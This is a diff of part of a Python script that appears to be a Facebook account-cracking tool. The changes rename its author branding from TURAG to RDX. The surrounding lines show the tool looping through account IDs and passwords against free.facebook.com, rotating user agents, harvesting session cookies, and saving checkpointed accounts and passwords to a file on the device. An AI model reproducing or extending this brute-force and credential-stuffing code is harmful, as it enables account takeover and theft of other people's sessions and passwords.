@@ -61,8 +61,8 @@ logo=("""
 \x1b[1;90m┃  \033[1;36m   \x1b[1;90m 
 \x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
 \033[1;96m═════════════════════════════════════════════
-\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m:Rdx
-\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;56m:Fucker-404 \x1b[1;94m
+\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: Rdx
+\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: FUCKER-404 \x1b[1;94m
 \x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;92mACTIVE
 \x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m1.2.0
 \033[1;96m═════════════════════════════════════════════
@@ -118,7 +118,7 @@ def rcrack(uid,pwx,tl):
             pro = random.choice(ugen)
             session = requests.Session()
             bi = random.choice([A,B,C,D,E,F,G,H])
-            sys.stdout.write(f'\r \033[1;31m[%sTURAG\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;31m[%sRDX\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
@@ -168,7 +168,7 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"\x1b[38;5;196m[RDX-💔] {uid} • {ps}")
-                open('/sdcard/TURAG-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/RDX-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
